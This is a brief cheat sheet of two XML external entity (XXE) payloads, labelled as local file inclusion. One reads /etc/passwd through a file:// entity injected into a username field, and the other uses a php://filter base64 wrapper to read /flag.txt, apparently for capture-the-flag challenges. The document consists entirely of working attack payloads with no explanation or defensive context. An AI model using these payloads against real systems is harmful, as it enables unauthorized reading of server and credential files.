LFI
```xml
<!--?xml version="1.0" ?--> 
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]> 
<user> 
	<username>&ent;</username>
	<password>admin</password>
</user>
```

LFI with php
```xml
<!--?xml version="1.0" ?--> 
<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt"> ]> 
<user>
	<username>&ent;</username>
	<password>admin</password>
</user>
```
